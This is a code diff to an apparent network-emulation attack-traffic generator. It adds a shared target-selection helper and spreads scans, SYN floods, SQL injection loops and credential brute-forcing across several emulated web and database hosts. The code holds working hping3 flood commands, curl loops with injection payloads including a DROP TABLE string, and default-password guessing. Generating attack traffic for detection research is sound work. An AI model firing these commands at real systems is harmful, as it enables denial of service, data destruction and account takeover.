@@ -100,36 +100,43 @@ class AttackGenerator:
     # Attack implementations
     # ------------------------------------------------------------------
 
+    def _get_target_ips(self, net, target_ip):
+        if net is None:
+            return [target_ip]
+        servers = [h for h in net.hosts if h.name.startswith("ws") or h.name.startswith("db") or h.name in ("h3", "h5", "h6")]
+        return [s.IP() for s in servers] if servers else [target_ip]
+
     def _start_probe(self, net, target_ip, target_port, cfg):
         hosts = self._get_attackers(net, count=1)
-        for h in hosts:
-            cmd = f"hping3 -S -p {target_port} --scan 1-1024 -i u500000 {target_ip}"
+        t_ips = self._get_target_ips(net, target_ip)
+        for i, h in enumerate(hosts):
+            t_ip = t_ips[i % len(t_ips)]
+            cmd = f"hping3 -S -p {target_port} --scan 1-1024 -i u500000 {t_ip}"
             self._spawn(h, cmd)
 
     def _start_dos(self, net, target_ip, target_port, cfg):
         attackers = self._get_attackers(net, count=None)
-        servers = [h for h in net.hosts if h.name.startswith("ws") or h.name.startswith("db") or h.name in ("h3", "h5", "h6")]
-        target_ips = [s.IP() for s in servers] if servers else [target_ip]
+        t_ips = self._get_target_ips(net, target_ip)
 
         for i, h in enumerate(attackers):
-            t_ip = target_ips[i % len(target_ips)]
+            t_ip = t_ips[i % len(t_ips)]
             # Flooding SYN packet attack targeting web/db servers
             cmd = f"hping3 --flood -S -p {target_port} -d 120 {t_ip}"
             self._spawn(h, cmd)
 
     def _start_ddos(self, net, target_ip, target_port, cfg):
         attackers = self._get_attackers(net, count=None)
-        servers = [h for h in net.hosts if h.name.startswith("ws") or h.name.startswith("db") or h.name in ("h3", "h5", "h6")]
-        target_ips = [s.IP() for s in servers] if servers else [target_ip]
+        t_ips = self._get_target_ips(net, target_ip)
 
         for i, h in enumerate(attackers):
-            t_ip = target_ips[i % len(target_ips)]
+            t_ip = t_ips[i % len(t_ips)]
             # High intensity volumetric flooding across all target servers
             cmd = f"hping3 --flood -S -p {target_port} -d 120 {t_ip}"
             self._spawn(h, cmd)
 
     def _start_sqli(self, net, target_ip, target_port, cfg):
-        hosts = self._get_attackers(net, count=1)
+        hosts = self._get_attackers(net, count=None)
+        t_ips = self._get_target_ips(net, target_ip)
         payloads = [
             "' OR '1'='1",
             "'; DROP TABLE users; --",
@@ -137,36 +144,41 @@ class AttackGenerator:
             "1' AND 1=1 --",
             "admin'--",
         ]
-        for h in hosts:
+        for i, h in enumerate(hosts):
+            t_ip = t_ips[i % len(t_ips)]
             payload_cmds = []
             for p in payloads:
                 encoded = p.replace("'", "%27").replace(" ", "%20").replace(";", "%3B")
                 payload_cmds.append(
-                    f"curl -s -o /dev/null -w '' 'http://{target_ip}:{target_port}/?id={encoded}' 2>/dev/null"
+                    f"curl -s -o /dev/null -w '' 'http://{t_ip}:{target_port}/?id={encoded}' 2>/dev/null"
                 )
             loop_body = " ; ".join(payload_cmds)
             cmd = f"bash -c 'while true; do {loop_body} ; sleep 0.5; done'"
             self._spawn(h, cmd)
 
     def _start_credential(self, net, target_ip, target_port, cfg):
-        hosts = self._get_attackers(net, count=1)
+        hosts = self._get_attackers(net, count=None)
+        t_ips = self._get_target_ips(net, target_ip)
         users = ["admin", "root", "user"]
         passwords = ["password", "123456", "admin"]
-        for h in hosts:
+        for i, h in enumerate(hosts):
+            t_ip = t_ips[i % len(t_ips)]
             cred_cmds = []
             for u in users:
                 for p in passwords:
                     cred_cmds.append(
-                        f"curl -s -o /dev/null -w '' 'http://{target_ip}:{target_port}/login?user={u}&pass={p}' 2>/dev/null"
+                        f"curl -s -o /dev/null -w '' 'http://{t_ip}:{target_port}/login?user={u}&pass={p}' 2>/dev/null"
                     )
             loop_body = " ; ".join(cred_cmds)
             cmd = f"bash -c 'while true; do {loop_body} ; sleep 0.2; done'"
             self._spawn(h, cmd)
 
     def _start_exfiltration(self, net, target_ip, target_port, cfg):
-        hosts = self._get_attackers(net, count=1)
-        for h in hosts:
-            cmd = f"hping3 -S -p {target_port} -d 1400 -i u100000 {target_ip}"
+        hosts = self._get_attackers(net, count=None)
+        t_ips = self._get_target_ips(net, target_ip)
+        for i, h in enumerate(hosts):
+            t_ip = t_ips[i % len(t_ips)]
+            cmd = f"hping3 -S -p {target_port} -d 1400 -i u100000 {t_ip}"
             self._spawn(h, cmd)
 
     def _get_attackers(self, net, count=None):
